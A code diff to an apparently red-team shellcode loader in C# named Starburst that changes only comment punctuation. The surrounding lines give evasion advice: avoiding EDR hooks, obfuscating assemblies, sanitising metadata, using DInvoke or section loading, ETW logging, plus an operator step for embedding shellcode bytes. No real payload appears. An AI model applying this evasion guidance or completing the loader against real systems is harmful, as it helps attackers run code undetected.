@@ -8,7 +8,7 @@
 //   - P/Invoke calls to kernel32 are monitored by EDR via ntdll hooks.
 //   - VirtualAlloc + CreateThread is a well-known shellcode pattern.
 //   - .NET assemblies can be decompiled trivially (use obfuscator).
-//   - Assembly metadata (name, GUID) is visible — sanitize before deployment.
+//   - Assembly metadata (name, GUID) is visible - sanitize before deployment.
 //   - Consider SectionLoader.cs or DInvoke.cs for better evasion.
 //   - CLR loading events are logged (ETW Microsoft-Windows-DotNETRuntime).
 //   - The /unsafe flag is required for pointer operations.
@@ -68,7 +68,7 @@ namespace Starburst
         // --- OPERATOR: Replace with actual shellcode bytes if not loading from file ---
         // Generate with: xxd -i starburst.bin | sed 's/unsigned char/byte[]/'
         static byte[] embeddedShellcode = new byte[] {
-            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER — replace with real shellcode
+            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER - replace with real shellcode
         };
 
         static void Main(string[] args)
